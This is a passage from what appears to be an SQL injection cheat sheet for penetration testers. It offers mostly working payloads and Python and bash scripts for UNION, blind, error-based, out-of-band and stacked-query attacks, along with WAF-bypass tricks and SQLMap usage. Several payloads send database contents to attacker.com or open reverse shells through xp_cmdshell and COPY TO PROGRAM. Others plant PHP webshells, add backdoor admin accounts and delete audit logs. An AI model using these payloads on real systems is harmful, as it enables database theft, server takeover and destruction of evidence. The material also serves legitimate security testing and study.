**PostgreSQL:**

```sql
-- Version
' UNION SELECT NULL,version(),NULL-- -

-- Current database
' UNION SELECT NULL,current_database(),NULL-- -

-- List tables
' UNION SELECT NULL,tablename,NULL FROM pg_tables WHERE schemaname='public'-- -

-- List columns
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'-- -

-- Extract data
' UNION SELECT NULL,username||':'||password,NULL FROM users-- -
```

**MSSQL:**

```sql
-- Version
' UNION SELECT NULL,@@version,NULL-- -

-- Current database
' UNION SELECT NULL,DB_NAME(),NULL-- -

-- List databases
' UNION SELECT NULL,name,NULL FROM sys.databases-- -

-- List tables
' UNION SELECT NULL,name,NULL FROM sys.tables-- -

-- List columns
' UNION SELECT NULL,name,NULL FROM sys.columns WHERE object_id=OBJECT_ID('users')-- -

-- Extract data
' UNION SELECT NULL,username+':'+password,NULL FROM users-- -
```

**Oracle:**

```sql
-- Version
' UNION SELECT NULL,banner,NULL FROM v$version-- -

-- List tables
' UNION SELECT NULL,table_name,NULL FROM all_tables-- -

-- List columns
' UNION SELECT NULL,column_name,NULL FROM all_tab_columns WHERE table_name='USERS'-- -

-- Extract data (requires FROM dual)
' UNION SELECT NULL,username||':'||password,NULL FROM users-- -

-- Oracle requires FROM clause
' UNION SELECT NULL,NULL FROM dual-- -
```

**SQLite:**

```sql
-- Version
' UNION SELECT NULL,sqlite_version(),NULL-- -

-- List tables
' UNION SELECT NULL,name,NULL FROM sqlite_master WHERE type='table'-- -

-- List columns
' UNION SELECT NULL,sql,NULL FROM sqlite_master WHERE name='users'-- -

-- Extract data
' UNION SELECT NULL,username||':'||password,NULL FROM users-- -
```

**4. Data Exfiltration Techniques:**

**Multiple Rows - LIMIT/OFFSET (MySQL):**

```sql
' UNION SELECT NULL,username,password FROM users LIMIT 1 OFFSET 0-- -
' UNION SELECT NULL,username,password FROM users LIMIT 1 OFFSET 1-- -
' UNION SELECT NULL,username,password FROM users LIMIT 1 OFFSET 2-- -
```

**Multiple Rows - GROUP_CONCAT (MySQL):**

```sql
' UNION SELECT NULL,GROUP_CONCAT(username),GROUP_CONCAT(password) FROM users-- -

-- With separator
' UNION SELECT NULL,GROUP_CONCAT(username,':',password SEPARATOR '<br>'),NULL FROM users-- -
```

**Multiple Rows - STRING_AGG (PostgreSQL):**

```sql
' UNION SELECT NULL,STRING_AGG(username||':'||password, ', '),NULL FROM users-- -
```

**Multiple Rows - LISTAGG (Oracle):**

```sql
' UNION SELECT NULL,LISTAGG(username||':'||password, ', '),NULL FROM users-- -
```

**Bypassing Output Limitations:**

```sql
-- Extract substring if output length limited
' UNION SELECT NULL,SUBSTR(password,1,10),NULL FROM users WHERE username='admin'-- -
' UNION SELECT NULL,SUBSTR(password,11,10),NULL FROM users WHERE username='admin'-- -
```

### Boolean-Based Blind SQLi

**Boolean-based blind SQLi infers data by observing application responses to true/false conditions.**

**Detection:**

```sql
-- Original request
/product?id=1

-- Test true condition
/product?id=1' AND '1'='1
-- Should return normal page

-- Test false condition
/product?id=1' AND '1'='2
-- Should return different page or error
```

**Data Extraction:**

**1. Determine Database Length:**

```sql
' AND LENGTH(database())>5-- -
' AND LENGTH(database())>10-- -
' AND LENGTH(database())=8-- -
```

**2. Extract Database Name Character by Character:**

```sql
-- First character
' AND SUBSTR(database(),1,1)='a'-- -
' AND SUBSTR(database(),1,1)='b'-- -
-- Continue until true response

-- Second character
' AND SUBSTR(database(),2,1)='a'-- -

-- ASCII comparison (faster with binary search)
' AND ASCII(SUBSTR(database(),1,1))>100-- -
' AND ASCII(SUBSTR(database(),1,1))>120-- -
' AND ASCII(SUBSTR(database(),1,1))=115-- -  (ASCII 115 = 's')
```

**3. Extract Table Names:**

```sql
-- Check if table exists
' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database() AND table_name='users')>0-- -

-- Extract table name length
' AND LENGTH((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1))=5-- -

-- Extract character by character
' AND SUBSTR((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1),1,1)='u'-- -
```

**4. Extract Column Names:**

```sql
' AND SUBSTR((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1),1,1)='u'-- -
```

**5. Extract Data:**

```sql
-- Extract username
' AND SUBSTR((SELECT username FROM users LIMIT 1),1,1)='a'-- -

-- Count users
' AND (SELECT COUNT(*) FROM users)>5-- -
```

**Automation Script:**

```python
#!/usr/bin/env python3
import requests
import string

url = "http://target.com/product?id=1"
result = ""

for position in range(1, 20):
    for char in string.ascii_lowercase + string.digits + '_':
        payload = f"' AND SUBSTR(database(),{position},1)='{char}'-- -"
        response = requests.get(url + payload)
        
        if len(response.text) == KNOWN_TRUE_LENGTH:  # Set based on testing
            result += char
            print(f"[+] Found: {result}")
            break
    else:
        break  # No more characters

print(f"[+] Database: {result}")
```

### Time-Based Blind SQLi

**Time-based blind SQLi uses database sleep functions to infer data when no visible output differences exist.**

**Detection:**

**MySQL:**

```sql
' AND SLEEP(5)-- -
' OR SLEEP(5)-- -

-- Conditional timing
' AND IF(1=1,SLEEP(5),0)-- -
' AND IF(1=2,SLEEP(5),0)-- -
```

**PostgreSQL:**

```sql
'; SELECT pg_sleep(5)-- -
' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)-- -
```

**MSSQL:**

```sql
'; WAITFOR DELAY '00:00:05'-- -
' AND IF(1=1,WAITFOR DELAY '00:00:05',0)-- -
```

**Oracle:**

```sql
' AND CASE WHEN (1=1) THEN dbms_lock.sleep(5) ELSE NULL END-- -
```

**SQLite:**

```sql
-- SQLite has no native sleep, use heavy computation
' AND CASE WHEN (1=1) THEN (SELECT COUNT(*) FROM sqlite_master WHERE name LIKE '%' AND randomblob(100000000)) END-- -
```

**Data Extraction:**

```sql
-- MySQL: Extract database name character by character
' AND IF(SUBSTR(database(),1,1)='a',SLEEP(5),0)-- -
' AND IF(SUBSTR(database(),1,1)='b',SLEEP(5),0)-- -

-- Binary search optimization
' AND IF(ASCII(SUBSTR(database(),1,1))>100,SLEEP(5),0)-- -
' AND IF(ASCII(SUBSTR(database(),1,1))>120,SLEEP(5),0)-- -
' AND IF(ASCII(SUBSTR(database(),1,1))=115,SLEEP(5),0)-- -
```

**Automation Script:**

```python
#!/usr/bin/env python3
import requests
import time

url = "http://target.com/product?id=1"
result = ""

for position in range(1, 20):
    # Binary search for ASCII value
    low, high = 32, 126
    
    while low <= high:
        mid = (low + high) // 2
        payload = f"' AND IF(ASCII(SUBSTR(database(),{position},1))>{mid},SLEEP(3),0)-- -"
        
        start = time.time()
        requests.get(url + payload, timeout=10)
        elapsed = time.time() - start
        
        if elapsed >= 3:
            low = mid + 1
        else:
            high = mid - 1
    
    if low > 126:
        break
        
    result += chr(low)
    print(f"[+] Found: {result}")

print(f"[+] Database: {result}")
```

### Error-Based SQLi

**Error-based SQLi extracts data through database error messages.**

**MySQL - EXTRACTVALUE:**

```sql
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))-- -
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT username FROM users LIMIT 1),0x7e))-- -

-- Bypass length limitation (32 chars)
' AND EXTRACTVALUE(1,CONCAT(0x7e,SUBSTR((SELECT password FROM users LIMIT 1),1,31)))-- -
```

**MySQL - UPDATEXML:**

```sql
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database()),0x7e),1)-- -
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(username,':',password) FROM users),0x7e),1)-- -
```

**MySQL - Double Query:**

```sql
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)-- -
```

**PostgreSQL - CAST:**

```sql
' AND 1=CAST((SELECT version()) AS int)-- -
' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)-- -
```

**MSSQL - CAST:**

```sql
' AND 1=CAST((SELECT @@version) AS int)-- -
' AND 1=CAST((SELECT username FROM users WHERE id=1) AS int)-- -
```

**Oracle - Invalid Query:**

```sql
' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM dual)='1'-- -
' AND CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))=1-- -
```

**Testing Script:**

```bash
#!/bin/bash
# error_based_sqli.sh

URL="$1"
PAYLOAD="' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))-- -"

response=$(curl -s "$URL$PAYLOAD")

if echo "$response" | grep -oP "~\K[^~]+"; then
    echo "[+] Database extracted via error message"
else
    echo "[-] No error-based extraction"
fi
```

### Out-of-Band (OOB) SQLi

**OOB SQLi exfiltrates data through external network requests (DNS, HTTP) when direct output is unavailable.**

**DNS Exfiltration (MySQL with LOAD_FILE):**

```sql
' AND LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.attacker.com\\abc'))-- -

-- Expected: DNS query to "databasename.attacker.com"
```

**DNS Setup:**

```bash
# DNS listener with tcpdump
sudo tcpdump -i eth0 -n port 53

# DNS server with dnsmasq
# Edit /etc/dnsmasq.conf:
log-queries
log-facility=/var/log/dnsmasq.log
```

**HTTP Exfiltration (MSSQL with xp_cmdshell):**

```sql
'; EXEC xp_cmdshell 'certutil -urlcache -split -f http://attacker.com/$(whoami)'-- -
'; EXEC master..xp_dirtree '\\attacker.com\share\'-- -
```

**Oracle with UTL_HTTP:**

```sql
' AND UTL_HTTP.request('http://attacker.com/'||(SELECT username FROM users WHERE ROWNUM=1))=1-- -
```

**PostgreSQL with COPY TO PROGRAM:**

```sql
'; COPY (SELECT username||':'||password FROM users) TO PROGRAM 'curl http://attacker.com/?data=$(cat)'-- -
```

**Listener Setup:**

```bash
# HTTP listener
sudo nc -lvnp 80

# Python HTTP server with logging
sudo python3 -m http.server 80
```

**Burp Collaborator Integration:**

```sql
-- Use Burp Collaborator domain
' AND LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.burpcollaborator.net\\abc'))-- -

-- Check Collaborator for DNS interactions
```

### Second-Order SQLi

**Second-order SQLi occurs when injected payload is stored and later executed in a different context.**

**Example Flow:**

```
1. User registration: username = admin'-- -
2. Stored in database as: admin'-- -
3. Later query: SELECT * FROM logs WHERE username='admin'-- -'
```

**Testing:**

```bash
# Register with SQLi payload
curl http://target.com/register -d "username=admin'-- -&password=pass123"

# Trigger execution (profile page, admin panel, logs)
curl -b "session=abc" http://target.com/profile
curl -b "session=abc" http://target.com/admin/view-user?username=admin

# Check for SQLi effects
```

**Common Locations:**

- User profiles
- Comments/posts
- Admin panels viewing user data
- Search history
- Email templates with user data
- Export/report functions

## Stacked Queries

**Stacked queries allow executing multiple SQL statements in one injection point using statement terminators.**

**Database Support:**

- âœ“ PostgreSQL
- âœ“ MSSQL
- âœ— MySQL (in most configurations with `mysql_query()`)
- âœ“ MySQL (with `mysqli_multi_query()`)
- âœ“ Oracle (with `EXECUTE IMMEDIATE`)

### Basic Syntax

**PostgreSQL/MSSQL:**

```sql
'; SELECT pg_sleep(5)-- -
'; WAITFOR DELAY '00:00:05'-- -

-- Multiple statements
'; DROP TABLE users; SELECT * FROM products-- -
```

**MySQL (if supported):**

```sql
'; SELECT SLEEP(5); #
'; DROP TABLE test; #
```

### Data Manipulation

**1. Creating Tables:**

```sql
-- PostgreSQL
'; CREATE TABLE pwned (data TEXT); INSERT INTO pwned VALUES ('hacked')-- -

-- MSSQL
'; CREATE TABLE pwned (data VARCHAR(100)); INSERT INTO pwned VALUES ('hacked')-- -
```

**2. Inserting Data:**

```sql
-- Add admin user
'; INSERT INTO users (username,password,role) VALUES ('hacker','$2y$10$hash','admin')-- -

-- MSSQL with explicit columns
'; INSERT INTO users (id,username,password) VALUES (999,'backdoor','pass123')-- -
```

**3. Updating Records:**

```sql
-- Privilege escalation
'; UPDATE users SET role='admin' WHERE username='attacker'-- -

-- Password reset
'; UPDATE users SET password='newpass' WHERE username='admin'-- -
```

**4. Deleting Data:**

```sql
-- Delete logs
'; DELETE FROM logs WHERE user_id=1-- -

-- Drop table
'; DROP TABLE audit_logs-- -
```

### Command Execution

**MSSQL - xp_cmdshell:**

```sql
-- Enable xp_cmdshell
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE-- -

-- Execute commands
'; EXEC xp_cmdshell 'whoami'-- -
'; EXEC xp_cmdshell 'net user hacker Pass123! /add'-- -
'; EXEC xp_cmdshell 'net localgroup administrators hacker /add'-- -

-- Reverse shell
'; EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://attacker.com/shell.ps1'')"'-- -
```

**PostgreSQL - COPY TO/FROM PROGRAM:**

```sql
-- Write file
'; COPY (SELECT 'test') TO '/tmp/pwned.txt'-- -

-- Execute command
'; CREATE TABLE cmd_output (output TEXT); COPY cmd_output FROM PROGRAM 'id'-- -
'; SELECT * FROM cmd_output-- -

-- Reverse shell
'; COPY (SELECT '') TO PROGRAM 'bash -c ''bash -i >& /dev/tcp/attacker.com/4444 0>&1'''-- -
```

**PostgreSQL - Large Object (lo_import/lo_export):**

```sql
-- Write webshell
'; SELECT lo_from_bytea(0, '<?php system($_GET[''cmd'']); ?>'); SELECT lo_export(CAST((SELECT max(oid) FROM pg_largeobject_metadata) AS int), '/var/www/html/shell.php')-- -
```

### File Operations

**MSSQL - Write File:**

```sql
-- Write using OPENROWSET
'; EXEC sp_configure 'Ole Automation Procedures',1; RECONFIGURE; DECLARE @o INT; EXEC sp_OACreate 'Scripting.FileSystemObject',@o OUT; EXEC sp_OAMethod @o,'CreateTextFile',NULL,'C:\temp\pwned.txt'-- -
```

**MySQL - OUTFILE:**

```sql
-- Write webshell (requires FILE privilege)
' UNION SELECT '<?php system($_GET[''cmd'']); ?>' INTO OUTFILE '/var/www/html/shell.php'-- -

-- Read file
' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL-- -
```

**PostgreSQL - pg_read_file:**

```sql
-- Read file (requires superuser)
'; SELECT pg_read_file('/etc/passwd',0,1000)-- -

-- Read server files
'; SELECT pg_read_file('/var/www/html/config.php',0,10000)-- -
```

### Privilege Escalation

**MSSQL - Impersonation:**

```sql
-- Check available impersonation targets
'; SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'-- -

-- Impersonate sa
'; EXECUTE AS LOGIN = 'sa'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE-- -
```

**PostgreSQL - CREATE USER:**

```sql
-- Create superuser
'; CREATE USER hacker WITH PASSWORD 'pass123' SUPERUSER-- -
```

**MySQL - GRANT:**

```sql
-- Grant privileges
'; GRANT ALL PRIVILEGES ON *.* TO 'attacker'@'%' IDENTIFIED BY 'pass123' WITH GRANT OPTION-- -
```

### Detection

**Check for stacked query support:**

```bash
# Timing test (PostgreSQL)
curl "http://target.com/product?id=1; SELECT pg_sleep(5)-- -"

# Timing test (MSSQL)
curl "http://target.com/product?id=1; WAITFOR DELAY '00:00:05'-- -"

# Error messages
curl "http://target.com/product?id=1; INVALID_QUERY-- -"
# If syntax error mentions second query, stacked queries work
```

## SQLi Tools

### SQLMap

**SQLmap is an automated SQL injection detection and exploitation tool.**

**Basic Usage:**

```bash
# Simple test
sqlmap -u "http://target.com/product?id=1"

# POST request
sqlmap -u "http://target.com/login" --data "username=admin&password=pass"

# Cookie-based
sqlmap -u "http://target.com/profile" --cookie "session=abc123"

# Custom header
sqlmap -u "http://target.com/api" --headers "Authorization: Bearer token123"
```

**Request From File:**

```bash
# Capture request in Burp, save to file
# Copy to Clipboard â†’ Save to request.txt

sqlmap -r request.txt

# Specify injection point with *
POST /login HTTP/1.1
Host: target.com

username=admin*&password=pass
```

**Common Options:**

```bash
# Enumerate databases
sqlmap -u "http://target.com/product?id=1" --dbs

# Enumerate tables in specific database
sqlmap -u "http://target.com/product?id=1" -D dbname --tables

# Enumerate columns
sqlmap -u "http://target.com/product?id=1" -D dbname -T users --columns

# Dump data
sqlmap -u "http://target.com/product?id=1" -D dbname -T users --dump

# Dump specific columns
sqlmap -u "http://target.com/product?id=1" -D dbname -T users -C username,password --dump

# Current user
sqlmap -u "http://target.com/product?id=1" --current-user

# Database version
sqlmap -u "http://target.com/product?id=1" --banner

# Current database
sqlmap -u "http://target.com/product?id=1" --current-db

# Check privileges
sqlmap -u "http://target.com/product?id=1" --privileges

# Check for DBA
sqlmap -u "http://target.com/product?id=1" --is-dba
```

**Advanced Techniques:**

```bash
# Specify injection technique
sqlmap -u "http://target.com/product?id=1" --technique=BEUST
# B: Boolean-based blind
# E: Error-based
# U: UNION query
# S: Stacked queries
# T: Time-based blind

# Risk and level
sqlmap -u "http://target.com/product?id=1" --level=5 --risk=3
# Level: 1-5 (tests more payloads)
# Risk: 1-3 (includes dangerous payloads)

# DBMS specification (faster)
sqlmap -u "http://target.com/product?id=1" --dbms=mysql

# Tamper scripts (WAF bypass)
sqlmap -u "http://target.com/product?id=1" --tamper=space2comment

# Multiple tampers
sqlmap -u "http://target.com/product?id=1" --tamper=between,space2comment,charencode

# Common tampers:
# space2comment: ' ' â†’ '/**/'
# between: '>' â†’ 'NOT BETWEEN 0 AND #'
# charencode: 'SELECT' â†’ 'CHAR(83)+CHAR(69)+...'
```

**File Operations:**

```bash
# Read file
sqlmap -u "http://target.com/product?id=1" --file-read="/etc/passwd"

# Write file
sqlmap -u "http://target.com/product?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
```

**OS Shell:**

```bash
# Attempt OS command execution
sqlmap -u "http://target.com/product?id=1" --os-shell

# SQL shell
sqlmap -u "http://target.com/product?id=1" --sql-shell

# Specific commands
sqlmap -u "http://target.com/product?id=1" --os-cmd="whoami"
```

**Performance Options:**

```bash
# Threads (careful with rate limiting)
sqlmap -u "http://target.com/product?id=1" --threads=10

# Random User-Agent
sqlmap -u "http://target.com/product?id=1" --random-agent

# Delay between requests
sqlmap -u "http://target.com/product?id=1" --delay=2

# Timeout
sqlmap -u "http://target.com/product?id=1" --timeout=30

# Retries
sqlmap -u "http://target.com/product?id=1" --retries=5
```

**Proxy and Tor:**

```bash
# HTTP proxy
sqlmap -u "http://target.com/product?id=1" --proxy="http://127.0.0.1:8080"

# Tor
sqlmap -u "http://target.com/product?id=1" --tor --check-tor

# Proxy file (multiple proxies)
sqlmap -u "http://target.com/product?id=1" --proxy-file=proxies.txt
```

**Session Management:**

```bash
# Resume session
sqlmap -u "http://target.com/product?id=1" --batch

# Flush session
sqlmap -u "http://target.com/product?id=1" --flush-session

# Session file location
~/.local/share/sqlmap/output/target.com/
```

**Output Options:**

```bash
# Verbose output
sqlmap -u "http://target.com/product?id=1" -v 3

# Save traffic
sqlmap -u "http://target.com/product?id=1" -t traffic.txt

# Parse errors
sqlmap -u "http://target.com/product?id=1" --parse-errors

# Output to file
sqlmap -u "http://target.com/product?id=1" --output-dir=/tmp/sqlmap_output
```

**Bypassing WAF/IPS:**

```bash
# Randomize case
sqlmap -u "http://target.com/product?id=1" --tamper=randomcase

# Time delay
sqlmap -u "http://target.com/product?id=1" --tamper=between --delay=3

# HPP (HTTP Parameter Pollution)
sqlmap -u "http://target.com/product?id=1" --hpp

# Chunked encoding
sqlmap -u "http://target.com/product?id=1" --chunked

# Custom User-Agent
sqlmap -u "http://target.com/product?id=1" --user-agent="Mozilla/5.0..."

# Randomize parameters
sqlmap -u "http://target.com/product?id=1" --randomize=parameter_name
```

**Batch Mode (no prompts):**

```bash
sqlmap -u "http://target.com/product?id=1" --batch --dbs
```

**API Mode:**

```bash
# Start API server
sqlmapapi -s -H 0.0.0.0 -p 8775

# Use API
curl http://127.0.0.1:8775/task/new
curl http://127.0.0.1:8775/scan/<task_id>/start -d "url=http://target.com/product?id=1"
```

### Burp Suite SQLi Detection

**Manual Testing in Repeater:**

```
1. Send request to Repeater (Ctrl+R)
2. Add SQLi payload to parameter
3. Observe response differences
4. Use Comparer to diff responses (Ctrl+Shift+C)
```

**Intruder Fuzzing:**

```bash
# Payload list location
/usr/share/seclists/Fuzzing/SQLi/

# Common payloads
Generic-SQLi.txt
quick-SQLi.txt
SQL-Injection-Strings-SQLi.txt
```

**Intruder Configuration:**

```
1. Send to Intruder (Ctrl+I)
2. Clear payload markers (Clear Â§)
3. Mark injection point (Add Â§)
4. Payloads â†’ Load â†’ SQLi wordlist
5. Options â†’ Grep-Match:
   - Add: "error", "syntax", "mysql", "warning"
6. Start attack
7. Filter by Grep Match column
```

**Collaborator for OOB:**

```sql
-- In payload list
' AND LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.BURP_COLLABORATOR.burpcollaborator.net\\a'))-- -

-- Intruder â†’ Options â†’ Grep-Extract
-- Check Collaborator Client for interactions
```

**Extensions:**

**SQLiPy Burp Extension:**

```
1. Extender â†’ BApp Store
2. Install "SQLiPy"
3. Right-click request â†’ Extensions â†’ SQLiPy
4. Automated SQLi testing with sqlmap integration
```

**CO2 Extension:**

```
1. Install CO2 from BApp Store
2. Provides SQLMap integration in Burp
3. Right-click â†’ Extensions â†’ SQLMap
```

**Active Scan Detection:**

```
1. Target â†’ Site map
2. Right-click target â†’ Actively scan this host
3. Scan configuration â†’ Select SQLi checks
4. Monitor Issues tab for findings
```

**Collaborator-Based Detection:**

```
Burp automatically tests OOB SQLi via Collaborator when:
- Active scanning is running
- Professional edition is used
- Collaborator is enabled (default)
```

**Manual SQLi Test Payloads:**

```sql
-- Error-based
'
''
`
``
"
""
'-- -
' OR '1'='1
' OR 1=1-- -
') OR ('1'='1
')) OR (('1'='1

-- Time-based
' AND SLEEP(5)-- -
'; WAITFOR DELAY '00:00:05'-- -
' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -

-- Union-based
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL-- -

-- Stacked queries
'; SELECT pg_sleep(5)-- -
'; WAITFOR DELAY '00:00:05'-- -
```

**Response Analysis:**

```
Compare responses for:
- Different Content-Length
- Different response time
- Error messages in response
- Different HTTP status codes
- Missing data in response
```

**Logger++ Extension:**

```
1. Install Logger++ from BApp Store
2. Automatically logs all requests/responses
```

## Advanced SQLi Techniques

### WAF Bypass Techniques

**1. Case Manipulation:**

```sql
-- Standard
' UNION SELECT NULL-- -

-- Mixed case
' UnIoN SeLeCt NULL-- -
' uNiOn sElEcT NULL-- -
```

**2. Comment Injection:**

```sql
-- Inline comments (MySQL)
'/*!UNION*//*!SELECT*/NULL-- -
'/**/UNION/**/SELECT/**/NULL-- -
'/*! UNION */ /*! SELECT */ NULL-- -

-- Version-specific comments
'/*!50000UNION*//*!50000SELECT*/NULL-- -
```

**3. URL Encoding:**

```sql
-- Standard
' UNION SELECT NULL-- -

-- URL encoded
%27%20UNION%20SELECT%20NULL--%20-

-- Double URL encoded
%2527%2520UNION%2520SELECT%2520NULL--+

-- Unicode encoding
\u0027\u0020UNION\u0020SELECT\u0020NULL--\u0020-
```

**4. Space Replacement:**

```sql
-- Tab character
'%09UNION%09SELECT%09NULL-- -

-- Newline
'%0AUNION%0ASELECT%0ANULL-- -

-- Plus sign
'+UNION+SELECT+NULL--+-

-- Comments
'/**/UNION/**/SELECT/**/NULL-- -

-- Parentheses
'UNION(SELECT(NULL))-- -
```

**5. String Concatenation:**

```sql
-- MySQL
'UNION(SELECT(CONCAT('a','d','min')))-- -
'UNION(SELECT(CONCAT_WS('','a','d','m','i','n')))-- -

-- PostgreSQL
'UNION(SELECT('a'||'d'||'min'))-- -

-- MSSQL
'UNION(SELECT('a'+'d'+'min'))-- -

-- Oracle
'UNION(SELECT('a'||'d'||'min')FROM dual)-- -
```

**6. Character Encoding:**

```sql
-- Hex encoding (MySQL)
'UNION SELECT 0x61646d696e-- -
-- 0x61646d696e = "admin"

-- CHAR() function
'UNION SELECT CHAR(97,100,109,105,110)-- -

-- ASCII concatenation
'UNION SELECT CONCAT(CHAR(97),CHAR(100),CHAR(109),CHAR(105),CHAR(110))-- -
```

**7. Alternative Syntax:**

```sql
-- MySQL alternative operators
' OR 'x'='x
' OR x=x-- -
' HAVING 1=1-- -

-- Boolean alternatives
' OR true-- -
' AND false-- -
' XOR true-- -

-- Bitwise operations
' OR 1|1-- -
' AND 1&1-- -
```

**8. Scientific Notation:**

```sql
-- Instead of: OR 1=1
' OR 1e0=1-- -
' OR 2e0=2-- -

-- Float comparison
' OR 1.0=1-- -
```

**9. NULL vs Empty String:**

```sql
-- If NULL filtered
'UNION SELECT ''-- -
'UNION SELECT 0-- -

-- If empty string filtered
'UNION SELECT NULL-- -
'UNION SELECT CHAR(0)-- -
```

**10. Conditional Comments (MSSQL):**

```sql
'UNION/*%00*/SELECT/*%00*/NULL-- -
```

**11. Buffer Overflow/Length Bypass:**

```sql
-- Add excessive padding
'UNION SELECT NULL' + ('A' * 10000) + '-- -

-- Fragment injection
'UNION/*aaaaaaa...10000 chars...aaaaaa*/SELECT NULL-- -
```

**12. HTTP Parameter Pollution (HPP):**

```bash
# Send duplicate parameters
http://target.com/product?id=1&id=' UNION SELECT NULL-- -

# Different parameter order
http://target.com/product?category=books&id=1' UNION SELECT NULL-- -&category=fiction
```

**Testing Script:**

```python
#!/usr/bin/env python3
import requests
import urllib.parse

url = "http://target.com/product"
payloads = [
    "' UNION SELECT NULL-- -",
    "' UnIoN SeLeCt NULL-- -",
    "'/**/UNION/**/SELECT/**/NULL-- -",
    "' UNION(SELECT(NULL))-- -",
    "'%09UNION%09SELECT%09NULL-- -",
]

for payload in payloads:
    encoded = urllib.parse.quote_plus(payload)
    response = requests.get(f"{url}?id={encoded}")
    
    if "error" in response.text.lower() or len(response.text) > 5000:
        print(f"[+] Potential SQLi: {payload}")
```

### Filter Bypass Techniques

**1. Blacklist Bypass - Keyword Filtering:**

```sql
-- If "UNION" is filtered
'/*!50000UNION*/ SELECT NULL-- -
'/**/UNI/**/ON/**/SEL/**/ECT NULL-- -
'UNI%00ON SE%00LECT NULL-- -

-- If "SELECT" is filtered
'UNION(SEL)ECT NULL-- -
'UNION%0ASELECT NULL-- -

-- If "WHERE" is filtered
'UNION SELECT NULL HAVING 1=1-- -
'UNION SELECT NULL LIMIT 1-- -

-- If "OR" is filtered
' || '1'='1
' | 1-- -
```

**2. Quote Bypass:**

```sql
-- If single quotes filtered, use hex
admin
0x61646d696e

-- If quotes filtered, use CHAR
' OR username=CHAR(97,100,109,105,110)-- -

-- Double quotes (if supported)
" OR "1"="1

-- Backticks (MySQL)
` OR `1`=`1
```

**3. Comment Bypass:**

```sql
-- If -- filtered
'#
'/*
';%00

-- If # filtered
' OR '1'='1'-- -
' OR '1'='1'/*

-- Multi-line comment
'/* comment */ OR 1=1/*

-- Null byte termination
' OR 1=1%00
```

**4. AND/OR Bypass:**

```sql
-- Logical operators
' XOR 1=1-- -
' DIV 1=1-- -

-- Mathematical operators
' | 1-- -
' & 1-- -

-- Concatenation
' || 1=1-- -
' + 1=1-- -
```

**5. Equals Sign Bypass:**

```sql
-- If "=" filtered
' OR 'admin' LIKE 'admin
' OR 'admin' IN ('admin')
' OR username REGEXP 'admin'
' OR username BETWEEN 'admin' AND 'admin'
' OR NOT username <> 'admin'
```

**6. Space Bypass (comprehensive):**

```sql
-- Tabs and newlines
'%09OR%091=1-- -
'%0AOR%0A1=1-- -
'%0DOR%0D1=1-- -

-- Comments
'/**/OR/**/1=1-- -

-- Parentheses
'OR(1)=(1)-- -
'OR(1=1)-- -

-- Plus sign
'+OR+1=1-- -

-- Alternative whitespace
'%A0OR%A01=1-- -
```

**7. Information_schema Bypass:**

```sql
-- MySQL alternatives
'UNION SELECT table_name FROM mysql.innodb_table_stats-- -
'UNION SELECT table_name FROM sys.x$schema_flattened_keys-- -

-- sys tables
'UNION SELECT table_name FROM sys.schema_table_statistics-- -

-- Direct table access (if known)
'UNION SELECT username,password FROM users-- -
```

**8. Substring Bypass:**

```sql
-- If SUBSTRING/SUBSTR filtered
'AND MID(database(),1,1)='a'-- -
'AND LEFT(database(),1)='a'-- -
'AND RIGHT(database(),1)='e'-- -

-- MySQL specific
'AND database() LIKE 'a%'-- -
'AND database() REGEXP '^a'-- -
```

**9. Function Name Bypass:**

```sql
-- If DATABASE() filtered
'UNION SELECT schema()-- - (MySQL synonym)
'UNION SELECT current_database()-- - (PostgreSQL)
'UNION SELECT DB_NAME()-- - (MSSQL)

-- If VERSION() filtered
'UNION SELECT @@version-- -
'UNION SELECT version()-- -
```

**10. Integer Conversion:**

```sql
-- If string input filtered
id=1' OR 1=1-- -
id=1 OR 1=1-- -
id=1'='1

-- String to int comparison
id=1 OR 'admin'='admin'-- -
```

### Polyglot Payloads

**Polyglot payloads work across multiple contexts and databases:**

```sql
-- Universal SQLi polyglot
SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/

-- Multi-database sleep
' OR SLEEP(5)=0 LIMIT 1-- -
' OR pg_sleep(5)-- -
'; WAITFOR DELAY '00:00:05'-- -

-- Universal comment
'-- -#

-- Universal authentication bypass
admin'-- -
admin'#
admin'/*
' OR '1'='1
' OR 1=1-- -
') OR ('1'='1
admin' OR '1'='1'-- -
' OR 1=1#

-- Union-based polyglot
' UNION SELECT NULL,NULL,NULL,NULL,NULL-- -#
```

**XSS + SQLi Polyglot:**

```sql
'><script>alert(1)</script>'-- -
' UNION SELECT '<script>alert(1)</script>',NULL-- -
```

### Routed SQLi (Second-Order via SQL Injection)

**Exploiting SQL injection to inject into queries used elsewhere:**

```sql
-- Insert SQLi payload into database
username: admin'-- -
